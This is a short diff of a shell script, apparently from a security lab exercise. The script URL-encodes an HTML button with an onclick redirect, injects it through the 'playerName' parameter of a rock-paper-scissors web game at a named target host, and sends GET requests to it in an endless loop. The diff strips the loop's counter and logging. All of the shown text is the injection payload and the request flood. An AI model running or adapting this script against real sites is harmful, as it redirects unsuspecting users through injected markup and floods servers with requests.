@@ -6,9 +6,6 @@ encoded_button_tag="%3Cbutton%20onclick%3D%22window.location.href%20%3D%20'https
 # Replace this URL with your target URL
 URL="https://stone.sifs0005.infs.ch/play?playerName=$encoded_button_tag&playerHand=Rock&mode=spock"
 
-i=1
 while true; do
-    echo "Sending GET request $i to $URL"
     curl -s "$URL" > /dev/null
-    ((i++))
 done
